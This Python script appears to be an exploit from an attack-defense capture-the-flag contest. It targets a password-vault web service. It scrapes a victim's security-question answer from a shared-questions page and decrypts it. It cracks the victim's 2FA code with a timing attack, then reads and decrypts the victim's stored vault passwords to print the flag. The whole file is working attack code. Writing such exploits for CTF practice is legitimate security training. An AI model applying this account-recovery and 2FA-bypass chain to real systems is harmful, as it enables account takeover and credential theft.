import sys
from typing import List
from utils import *

# Checker is configured with:  flag_id_types = ['username', 'username']

def exploit(target: str, flag_ids_username: List[str]):

	# only need one flag
	#for flag_id in flag_ids_username:
	flag_id = flag_ids_username[0]

	print(f"Attacking {flag_id}")
	
	# Login as random user and get shared question answer of user flag_id
	s = register_and_login(target, random_string(), random_string())

	resp = s.get(f"http://{target}:{PORT}/questions/shared/", timeout = TIMEOUT)
	regex_shared_question = rf'decrypt_id\("(.*)", "{flag_id}", "1_{flag_id}_answer"\)'
	
	try:
		shared_question = findall(regex_shared_question, resp.text)[0]
	except IndexError as e:
		print(resp.text)
		print(regex_shared_question)
		raise e
	recovery_answer = decrypt(shared_question, flag_id)
	s.close()

	#s = login_recovery(target, flag_id, recovery_answer)
	# Crack 2FA code through timing attack
	s = crack_code(target, flag_id, recovery_answer)

	resp = s.get(f"http://{target}:{PORT}/vault/passwords/", timeout = TIMEOUT)
	password_password = findall(REGEX_PASSWORD_PASSWORD, resp.text)[0]
	print(decrypt(password_password, flag_id)) # flag

	s.close()


if __name__ == '__main__':
	exploit(sys.argv[1], sys.argv[3].split(',')) # Flag2 uses second list of flag_ids 
